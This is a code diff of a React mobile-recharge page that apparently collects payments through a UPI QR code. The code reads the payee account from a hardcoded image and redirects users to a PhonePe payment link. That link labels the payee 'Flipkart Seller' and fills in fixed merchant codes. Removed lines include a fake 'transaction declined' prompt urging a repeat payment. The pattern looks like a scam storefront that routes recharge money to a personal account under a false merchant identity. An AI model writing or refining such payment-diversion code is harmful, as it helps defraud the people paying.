@@ -3,7 +3,7 @@ import React, { useState, useEffect, useRef } from 'react';
 import Swal from 'sweetalert2';
 import jsQR from "jsqr";
 
-// ======================= PHONEPE HELPER FUNCTIONS =======================
+// ======================= PHONEPE DEEPLINK HELPERS =======================
 function toBase64(str) {
   return btoa(
     encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) =>
@@ -40,128 +40,11 @@ function createPhonePeDeepLink(vpa, amountInRupees, note = "") {
   return `phonepe://native?data=${encoded}&id=p2ppayment`;
 }
 
-// ======================= QR CODE PAYMENT METHOD =======================
-const processQRPayment = (amount, onSuccess, onError) => {
-  const img = new Image();
-  img.crossOrigin = "Anonymous";
-
-  img.onload = () => {
-    try {
-      // Create canvas
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d", { willReadFrequently: true });
-      
-      canvas.width = img.naturalWidth || img.width;
-      canvas.height = img.naturalHeight || img.height;
-      
-      ctx.imageSmoothingEnabled = true;
-      ctx.imageSmoothingQuality = "high";
-      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-
-      // Get image data
-      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-      
-      // Decode QR code
-      let code = jsQR(imageData.data, canvas.width, canvas.height);
-      
-      // Try inverted if not found
-      if (!code) {
-        const invertedData = new Uint8ClampedArray(imageData.data);
-        for (let i = 0; i < invertedData.length; i += 4) {
-          invertedData[i] = 255 - invertedData[i];
-          invertedData[i+1] = 255 - invertedData[i+1];
-          invertedData[i+2] = 255 - invertedData[i+2];
-        }
-        const invertedImageData = new ImageData(invertedData, canvas.width, canvas.height);
-        code = jsQR(invertedImageData.data, canvas.width, canvas.height);
-      }
-
-      if (!code) {
-        onError("QR code not found in image");
-        return;
-      }
-
-      console.log("QR Code detected:", code.data);
-      
-      // Parse QR data
-      const qrData = code.data;
-      
-      // Check if it's a UPI QR code
-      if (!qrData.includes("upi://pay") && !qrData.includes("pay?pa=")) {
-        onError("Not a valid UPI QR code");
-        return;
-      }
-
-      // Extract UPI parameters
-      const query = qrData.split("?")[1];
-      if (!query) {
-        onError("Invalid QR code format");
-        return;
-      }
-
-      const params = new URLSearchParams(query);
-      const pa = params.get("pa") || "";
-      const pn = params.get("pn") || "Merchant";
-      const tr = params.get("tr") || Math.floor(Math.random() * 10000000000).toString();
-      const cu = params.get("cu") || "INR";
-      
-      if (!pa) {
-        onError("Missing payee account in QR code");
-        return;
-      }
-
-      // Create PhonePe deep link
-      try {
-        const phonePeLink = createPhonePeDeepLink(pa, amount, "Recharge Payment");
-        onSuccess(phonePeLink);
-      } catch (error) {
-        // Fallback to generic PhonePe link
-        const site_name = "Recharge";
-        const fallbackUrl = `phonepe://pay?pa=${pa}&pn=${encodeURIComponent(pn)}&am=${amount}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=${cu}&tn=${encodeURIComponent(site_name)}`;
-        onSuccess(fallbackUrl);
-      }
-
-    } catch (error) {
-      onError(error.message);
-    }
-  };
-
-  img.onerror = () => onError("Failed to load QR code image");
-  
-  // Try multiple image paths
-  const imagePaths = [
-    "/src/Qr-nik.jpg"
-  ];
-  
-  let pathIndex = 0;
-  const tryLoadImage = () => {
-    if (pathIndex >= imagePaths.length) {
-      onError("QR code image not found");
-      return;
-    }
-    img.src = imagePaths[pathIndex];
-    pathIndex++;
-  };
-
-  const originalOnError = img.onerror;
-  img.onerror = (error) => {
-    if (pathIndex < imagePaths.length) {
-      tryLoadImage();
-    } else {
-      originalOnError(error);
-    }
-  };
-
-  tryLoadImage();
-};
-
 // ======================= MAIN COMPONENT =======================
 function RechargePage() {
   const { number: enteredNumber, selectedOption: selectedPlan } = useParams();
   const [packages, setPackages] = useState([]);
-  const [paymentAmount, setPaymentAmount] = useState(null);
   const [isProcessing, setIsProcessing] = useState(false);
-  const paymentAmountRef = useRef(null);
 
   const images = {
     jio: '/images/jio.png',
@@ -202,8 +85,8 @@ function RechargePage() {
     window.location.href = `/processing?number=${enteredNumber}&provider=${provider[selectedPlan]}&amount=${amount}`;
   }
 
-  // QR Code payment method
-  function initiateQRPayment(amount) {
+  // Integrated jsQR Payment Logic
+  const initiateQRPayment = (amount) => {
     if (isProcessing) return;
     setIsProcessing(true);
 
@@ -218,77 +101,56 @@ function RechargePage() {
       }
     });
 
-    processQRPayment(
-      amount,
-      (redirectUrl) => {
+    const img = new Image();
+
+    img.onload = () => {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      canvas.width = img.width;
+      canvas.height = img.height;
+      ctx.drawImage(img, 0, 0);
+
+      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      const code = jsQR(imageData.data, canvas.width, canvas.height);
+
+      if (!code) {
         setIsProcessing(false);
-        Swal.close();
-        
-        // Show success and redirect
-        Swal.fire({
-          icon: 'success',
-          title: 'Ready to Pay!',
-          text: 'Opening PhonePe app...',
-          timer: 1500,
-          showConfirmButton: false
-        }).then(() => {
-          window.location.href = redirectUrl;
-        });
-      },
-      (error) => {
+        Swal.fire({ icon: 'error', title: 'Error', text: 'QR code not found' });
+        return;
+      }
+
+      const query = code.data.split("?")[1];
+      if (!query) {
         setIsProcessing(false);
-        Swal.fire({
-          icon: 'error',
-          title: 'Payment Error',
-          text: error || 'Failed to process payment. Please try again.',
-          confirmButtonText: 'Retry',
-          cancelButtonText: 'Cancel',
-          showCancelButton: true
-        }).then((result) => {
-          if (result.isConfirmed) {
-            initiateQRPayment(amount);
-          }
-        });
+        Swal.fire({ icon: 'error', title: 'Error', text: 'Invalid QR code' });
+        return;
       }
-    );
-  }
 
-  // Fallback UPI payment method
-  // function makePayment(amount) {
-  //   setPaymentAmount(amount);
-  //   paymentAmountRef.current = amount;
+      const params = new URLSearchParams(query);
+      const pa = params.get("pa") || "";
+      const tr = params.get("tr") || Math.floor(Math.random() * 10000000000);
+      const site_name = "Flipkart Seller";
 
-  //   fetch('/upi.txt')
-  //     .then(response => response.text())
-  //     .then(upiLink => {
-  //       if (!upiLink.includes('am=')) {
-  //         showPaymentFailedModal();
-  //         return;
-  //       }
+      // Always processing via PhonePe deep links as per your template structure
+      let redirect_url = `phonepe://pay?pa=${pa}&pn=${encodeURIComponent(site_name)}&am=${amount}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${encodeURIComponent(site_name)}`;
 
-  //       const updatedUpiLink = upiLink.replace(/am=\d|am=null/, `am=${amount}`);
-  //       window.location.href = updatedUpiLink;
-  //     })
-  //     .catch(() => {
-  //       showPaymentFailedModal();
-  //     });
-  // }
+      setIsProcessing(false);
+      Swal.close();
 
-  function showPaymentFailedModal() {
-    Swal.fire({
-      icon: 'warning',
-      title: 'Your transaction has been declined!',
-      showCancelButton: true,
-      confirmButtonText: 'Try Again',
-      cancelButtonText: 'Cancel',
-      confirmButtonColor: '#3085d6',
-      cancelButtonColor: '#6E7881',
-    }).then((result) => {
-      if (result.isConfirmed) {
-        makePayment(paymentAmountRef.current);
+      if (redirect_url) {
+        window.location.href = redirect_url;
       }
-    });
-  }
+    };
+
+    img.onerror = () => {
+      setIsProcessing(false);
+      Swal.fire({ icon: 'error', title: 'Error', text: 'QR code image asset not found' });
+    };
+
+    // Resolves image asset location matching your public folder setup
+    img.src = "/Qr-nik.jpg"; 
+  };
 
   return (
     <div>
@@ -422,7 +284,6 @@ function RechargePage() {
           ))}
         </div>
         
-        <div></div>
         <img src="/images/footer.jpg" alt="" className="mt-10" />
       </div>
     </div>
